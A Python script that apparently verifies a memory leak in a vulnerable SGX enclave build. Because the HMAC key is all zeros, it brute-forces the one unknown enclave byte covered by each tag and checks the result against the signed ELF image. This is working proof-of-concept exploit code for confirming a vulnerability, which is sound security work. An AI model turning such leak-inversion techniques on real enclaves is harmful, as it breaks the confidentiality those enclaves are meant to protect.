#!/usr/bin/env python3
"""Check whether a tag produced by the vulnerable build really leaks enclave memory.

The test program points p_labelu at enclave vaddr 0x2000 and p_datau at a host
buffer filled with ((j*37+11)&0xff).  Each returned HMAC therefore covers

    784 known bytes || 1 unknown enclave byte

With the zero HMAC key (ecall_init was never called) the tag can be inverted:
try all 256 values for the label byte and keep the one that reproduces the tag.

Usage:
    verify_leak.py --tag <hex> --elf <enclave.signed.so> [--vaddr 0x2000]
"""

import argparse
import hashlib
import hmac
import struct
import sys


DATA_HEADER = 16
IMG_PIXELS = 784


def pattern(j: int) -> int:
    return (j * 37 + 11) & 0xFF


def vaddr_to_offset(path: str, vaddr: int):
    with open(path, "rb") as f:
        ident = f.read(64)
        if ident[:4] != b"\x7fELF" or ident[4] != 2:
            raise SystemExit("not an ELF64 file: %s" % path)
        e_phoff = struct.unpack_from("<Q", ident, 0x20)[0]
        e_phentsize = struct.unpack_from("<H", ident, 0x36)[0]
        e_phnum = struct.unpack_from("<H", ident, 0x38)[0]
        for i in range(e_phnum):
            f.seek(e_phoff + i * e_phentsize)
            ph = f.read(e_phentsize)
            p_type = struct.unpack_from("<I", ph, 0x00)[0]
            if p_type != 1:  # PT_LOAD
                continue
            p_offset = struct.unpack_from("<Q", ph, 0x08)[0]
            p_vaddr = struct.unpack_from("<Q", ph, 0x10)[0]
            p_filesz = struct.unpack_from("<Q", ph, 0x20)[0]
            if p_vaddr <= vaddr < p_vaddr + p_filesz:
                return p_offset + (vaddr - p_vaddr)
    return None


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--tag", required=True)
    ap.add_argument("--elf", required=True)
    ap.add_argument("--vaddr", default="0x2000")
    args = ap.parse_args()

    tag = bytes.fromhex(args.tag)
    vaddr = int(args.vaddr, 0)

    message = bytes(pattern(j) for j in range(DATA_HEADER, DATA_HEADER + IMG_PIXELS))
    key = b"\x00" * 128

    recovered = None
    for candidate in range(256):
        digest = hmac.new(key, message + bytes([candidate]), hashlib.sha256).digest()
        if hmac.compare_digest(digest, tag):
            recovered = candidate
            break

    if recovered is None:
        print("LEAK_NOT_INVERTIBLE (key was not the all-zero key)")
        return 1

    print("RECOVERED_ENCLAVE_BYTE=0x%02x" % recovered)

    offset = vaddr_to_offset(args.elf, vaddr)
    if offset is None:
        print("LEAK_CONFIRMED (could not read the ELF to cross-check)")
        return 0

    with open(args.elf, "rb") as f:
        f.seek(offset)
        expected = f.read(1)[0]

    print("ELF_BYTE_AT_VADDR=0x%02x" % expected)
    if expected == recovered:
        print("LEAK_CONFIRMED: the enclave leaked %s byte 0x%02x" % (hex(vaddr), recovered))
        return 0

    print("LEAK_CONFIRMED_DIFFERENT (enclave page differs from the ELF image)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
